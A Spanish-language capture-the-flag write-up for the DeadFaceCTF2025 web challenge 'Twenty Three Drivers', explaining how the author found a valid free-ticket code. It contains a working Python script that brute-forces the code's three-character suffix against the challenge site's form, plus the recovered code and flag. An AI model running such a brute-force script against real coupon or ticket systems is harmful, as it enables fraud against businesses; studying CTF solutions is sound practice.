---
title: 23 Drivers - DeadFaceCTF2025
author: Kesero
description: Reto basado en obtener un código de descuento en una página web mediante un ataque de fuerza bruta personalizado en python
date: 2025-12-11 19:00:00 +0000
categories: [Writeups Competiciones Internacionales, Web]
tags: [Web, Web - Fuerza Bruta, Otros - Writeups, Dificultad - Fácil, DeadFaceCTF]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/prompt.png
  lqip: 
  alt: 
comments: true
---
Autor del reto: `Desconocido`

Dificultad: <font color=green>Fácil</font>

## Enunciado

```
My favorite band 'Twenty Three Drivers' gave away some free tickets to there upcoming secret show.
From a fanforum you know some of these codes (23D8BG / 23DAL2 / 23DR0S), but they are all used.

Can you help me get a free ticket for this show?
```

## Archivos

- `https://23drivers.ctf.zone/`: Página web principal del grupo de música.

Archivos utilizados en mi [repositorio de Github](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers).


## Analizando el reto

Al entrar en la página web del grupo de música encontramos su página principal.

![main_page](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/1.png)

![main_page_code](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/2.png)

El enunciado indica que varios códigos gratuitos `23D8BG` `23DAL2` `23DR0S` ya han sido reclamados.

## Solver

Si nos fijamos en los códigos gratuitos, todos empiezan por los caracteres `23D` y cuentan con un total de 6 caracteres.

Para obtener un código válido, se utilizará un ataque de fuerza bruta básico contra la sección `Win Action` para obtener el código válido que nos permita obtener una entrada gratuita.

El script en python final es el siguiente:

```py
import requests
import itertools
import string
from time import sleep
from tqdm import tqdm

url = "https://23drivers.ctf.zone/"
field_name = "secret_code"
prefix = "23D"
chars = string.ascii_uppercase + string.digits
suffix_len = 3

msg_used = "already used"       
msg_invalid = "unknown code!"

session = requests.Session()

def gen_codes():
    for tup in itertools.product(chars, repeat=suffix_len):
        yield prefix + ''.join(tup)

def try_code(code):
    data = {field_name: code}
    r = session.post(url, data=data, timeout=10)
    return r

def main():
    for i, code in tqdm(enumerate(gen_codes(), start=1)):
        r = try_code(code)
        text_lower = r.text.lower()

        if msg_used.lower() in text_lower:
            pass 
        elif msg_invalid.lower() in text_lower:
            pass 
        else:
            print(f"[VALID] {code}")
            print("Snippet:\n", r.text[:500])
            return 

        if i % 500 == 0:
            print(f"Probados {i} códigos...")

if __name__ == "__main__":
    main()
```

```
┌──(kesero㉿kali)-[~]
└─$ python solver.py

    [VALID] 23DF2W
```

Una vez obtenido el código `23DF2W` válido, se canjeará en la página web para obtener la entrada gratuita.

![entrada](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/3.png)

La flag se encuentra al escanear el código de la entrada al concierto.

## Flag
`flag{5c2eb61a39c2528008508b687d0af328}`